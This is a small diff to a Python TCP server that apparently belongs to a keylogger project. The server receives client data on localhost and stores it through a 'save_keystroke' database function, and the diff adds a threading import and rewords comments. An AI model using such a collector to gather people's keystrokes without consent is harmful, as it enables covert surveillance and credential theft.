@@ -1,5 +1,6 @@
 import socket
 from Database import connect_db, create_table, save_keystroke, close_db
+import threading
 #Set up the server
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_ip = '127.0.0.1'  # Localhost (adjust if necessary)
@@ -20,9 +21,11 @@ while True:
     while True:
         data = client_socket.recv(1024).decode('utf-8')  # Receive data from client
         if not data:
-            break  #Exit loop if no data /client disconnected
+            break  #Exit loop if no data / client disconnected
         print(f"Received from client: {data}")
-        save_keystroke(conn, data)  # Save the received data into the database
+        """Save the received data into the database for each client separately 
+        """
+        save_keystroke(conn, data) 
     client_socket.close()  # Close connection with client
 
 close_db(conn) #Close the database connection when server shuts down
